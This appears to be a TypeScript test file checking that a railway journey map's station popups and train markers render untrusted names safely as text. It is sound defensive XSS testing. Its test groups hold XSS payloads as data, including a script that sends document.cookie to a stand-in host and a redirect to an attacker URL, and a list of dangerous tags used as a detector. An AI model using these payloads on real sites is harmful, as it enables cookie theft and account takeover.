import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import {
  escapeHtml,
  createStationPopupNode,
  createTrainMarkerNode,
} from '../../web/components/map/mapDOMUtils.js';

class MockNode {
  nodeType: number;
  tagName: string;
  style: Record<string, string> & { cssText?: string } = { cssText: '' };
  className = '';
  id = '';
  attributes: Record<string, string> = {};
  childNodes: MockNode[] = [];
  private _textValue = '';

  constructor(tagName: string, nodeType = 1) {
    this.tagName = tagName.toUpperCase();
    this.nodeType = nodeType;
  }

  setAttribute(name: string, val: string) {
    this.attributes[name] = val;
  }

  getAttribute(name: string): string | undefined {
    return this.attributes[name];
  }

  appendChild(child: MockNode): MockNode {
    this.childNodes.push(child);
    return child;
  }

  get textContent(): string {
    if (this.nodeType === 3) return this._textValue;
    return this.childNodes.map(c => c.textContent).join('');
  }

  set textContent(val: string) {
    this._textValue = String(val);
    const textChild = new MockNode('#text', 3);
    textChild._textValue = String(val);
    this.childNodes = [textChild];
  }

  getElementsByTagName(name: string): MockNode[] {
    const results: MockNode[] = [];
    const search = (node: MockNode) => {
      for (const child of node.childNodes) {
        if (child.tagName === name.toUpperCase()) results.push(child);
        search(child);
      }
    };
    search(this);
    return results;
  }

  hasExecutableElements(): boolean {
    const dangerous = ['SCRIPT', 'IFRAME', 'OBJECT', 'EMBED', 'IMG'];
    const check = (node: MockNode): boolean => {
      if (node.nodeType === 1 && dangerous.includes(node.tagName)) {
        return true;
      }
      for (const attr of Object.keys(node.attributes)) {
        if (attr.toLowerCase().startsWith('on')) return true;
      }
      return node.childNodes.some(c => check(c));
    };
    return check(this);
  }
}

class MockDocument {
  createElement(tagName: string): MockNode {
    const el = new MockNode(tagName, 1);
    el.style = { cssText: '' };
    return el;
  }

  createElementNS(_ns: string, tagName: string): MockNode {
    return this.createElement(tagName);
  }

  createTextNode(text: string): MockNode {
    const node = new MockNode('#text', 3);
    node.textContent = text;
    return node;
  }
}

const mockDoc = new MockDocument() as unknown as Document;

describe('JourneyMap Security & Safe DOM Rendering Tests', () => {

  describe('1. HTML Sensitive Character Escaping Utility', () => {
    it('escapes &, <, >, ", and \' characters correctly', () => {
      const raw = '<script>alert("XSS & \'test\'")</script>';
      const escaped = escapeHtml(raw);
      assert.equal(
        escaped,
        '&lt;script&gt;alert(&quot;XSS &amp; &#39;test&#39;&quot;)&lt;/script&gt;'
      );
    });

    it('handles empty, null, or undefined strings gracefully', () => {
      assert.equal(escapeHtml(''), '');
      assert.equal(escapeHtml(null as unknown as string), '');
      assert.equal(escapeHtml(undefined as unknown as string), '');
    });

    it('leaves ordinary alphanumeric text unchanged', () => {
      const text = 'New Delhi Express 12952';
      assert.equal(escapeHtml(text), text);
    });
  });

  describe('2. Station Popup DOM Safety (Eliminating setHTML / Executable Markup)', () => {
    it('renders malicious station names as safe text without executing markup or creating script tags', () => {
      const maliciousPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(document.cookie)>',
        '<b onmouseover="stealTokens()">Hover</b>',
        '"><script>window.location="https://attacker.com"</script>',
      ];

      for (const payload of maliciousPayloads) {
        const popup = createStationPopupNode(
          {
            stationId: 'MALICIOUS_ID',
            stationName: payload,
            etaStr: '07:30 PM',
          },
          mockDoc
        ) as unknown as MockNode;

        // Verify textContent literally contains the payload text safely
        assert.ok(
          popup.textContent.includes(payload),
          `Popup text content should display raw payload text as text: ${payload}`
        );

        // Verify no child <script> or <img> or executable elements were created in the DOM
        const scripts = popup.getElementsByTagName('script');
        assert.equal(scripts.length, 0, 'Must NOT contain any script tags in DOM');

        const images = popup.getElementsByTagName('img');
        assert.equal(images.length, 0, 'Must NOT contain any img tags in DOM');

        assert.equal(
          popup.hasExecutableElements(),
          false,
          'Must not contain any dangerous elements or on* handler attributes'
        );
      }
    });

    it('renders ordinary station names and ETA timestamps correctly with proper hierarchy', () => {
      const popup = createStationPopupNode(
        {
          stationId: 'NDLS',
          stationName: 'New Delhi Railway Station',
          etaStr: '06:15 AM',
        },
        mockDoc
      ) as unknown as MockNode;

      assert.ok(popup.textContent.includes('NDLS - New Delhi Railway Station'));
      assert.ok(popup.textContent.includes('ETA 06:15 AM'));
      assert.equal(popup.childNodes.length, 2, 'Popup should have title and ETA container divs');
    });

    it('handles missing or undefined station name and ETA gracefully without crashing', () => {
      const popup = createStationPopupNode(
        {
          stationId: 'CNB',
          stationName: null,
          etaStr: undefined,
        },
        mockDoc
      ) as unknown as MockNode;

      assert.ok(popup.textContent.includes('CNB - '));
      assert.ok(popup.textContent.includes('ETA --:--'));
    });
  });

  describe('3. Train Radar Marker DOM Safety (Eliminating innerHTML with Untrusted Data)', () => {
    it('renders untrusted nextStationName safely via DOM text nodes', () => {
      const xssStationName = '<script>fetch("https://evil.com/" + document.cookie)</script>';
      const trainMarker = createTrainMarkerNode(
        {
          speed: 130,
          heading: 45,
          nextStationName: xssStationName,
          nextEtaStr: '11:45 AM',
        },
        mockDoc
      ) as unknown as MockNode;

      // Text content safely displays the station name as literal text
      assert.ok(trainMarker.textContent.includes(xssStationName));

      // No executable child nodes or event handlers exist in the DOM
      const scripts = trainMarker.getElementsByTagName('script');
      assert.equal(scripts.length, 0, 'Must NOT inject any script elements in DOM');

      assert.equal(
        trainMarker.hasExecutableElements(),
        false,
        'Must not contain any dangerous elements or on* handlers'
      );
    });

    it('preserves train telemetry display (speed, heading, brand, ETA) accurately', () => {
      const trainMarker = createTrainMarkerNode(
        {
          speed: 125,
          heading: 90,
          nextStationName: 'KANPUR CENTRAL',
          nextEtaStr: '02:30 PM',
        },
        mockDoc
      ) as unknown as MockNode;

      const fullText = trainMarker.textContent;
      assert.ok(fullText.includes('KANPUR CENTRAL'), 'Includes next station name');
      assert.ok(fullText.includes('ETA — 02:30 PM'), 'Includes ETA');
      assert.ok(fullText.includes('#RAJDHANI'), 'Includes brand tag');
      assert.ok(fullText.includes('125 km/h'), 'Includes speed');
      assert.ok(fullText.includes('BEARING 90°'), 'Includes heading bearing');
    });

    it('falls back safely when nextStationName is missing or null', () => {
      const trainMarker = createTrainMarkerNode(
        {
          speed: 0,
          heading: 0,
          nextStationName: null,
          nextEtaStr: '--:--',
        },
        mockDoc
      ) as unknown as MockNode;

      assert.ok(trainMarker.textContent.includes('Unknown'));
      assert.ok(trainMarker.textContent.includes('ETA — --:--'));
      assert.ok(trainMarker.textContent.includes('0 km/h'));
    });
  });
});
